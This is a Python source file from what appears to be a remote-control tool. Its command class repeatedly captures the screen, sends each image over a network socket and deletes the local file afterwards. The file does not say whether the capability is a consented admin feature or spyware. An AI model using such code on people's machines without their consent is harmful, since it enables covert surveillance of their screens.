import os
from Universal import Command
from Universal.constants import CommandConstants as consts
from PIL import ImageGrab
from Queue import Queue
from threading import Thread
from time import time, sleep


class ScreenshotCommand(Command):
    def __init__(self, command_literal, connection_socket, screenshot_count, time_gap):
        super(ScreenshotCommand, self).__init__(command_literal, connection_socket, screenshot_count=screenshot_count,
                                                time_gap=time_gap)

    def _save_screenshots(self):
        for i in xrange(self.screenshot_count):
            img = ImageGrab.grab()
            screenshot_path = os.path.join(os.path.curdir, consts.SCREENSHOT_TEMP_PATH.format(time()))
            img.save(screenshot_path)
            self.screenshots_queue.put(screenshot_path, block=False)
            sleep(self.time_gap)

    def _send_screenshots(self):
        for i in xrange(self.screenshot_count):
            while self.screenshots_queue.empty():
                sleep(self.time_gap)
            # there is a screenshot in queue to be sent
            screenshot_path = self.screenshots_queue.get(block=False)
            with open(screenshot_path, 'rb') as screenshot:
                screenshot_data = screenshot.read()
            # send screenshot data
            self.connection_socket.send_data(screenshot_data)
            # send screenshot name
            screenshot_name = os.path.split(screenshot_path)[1]
            self.connection_socket.send_data(screenshot_name)
            # delete screenshot
            os.remove(screenshot_path)


    def run(self):
        self.screenshots_queue = Queue(self.screenshot_count)
        save_thread = Thread(target=self._save_screenshots)
        send_thread = Thread(target=self._send_screenshots)
        # start thread
        save_thread.start()
        send_thread.start()
        save_thread.join()
        send_thread.join()


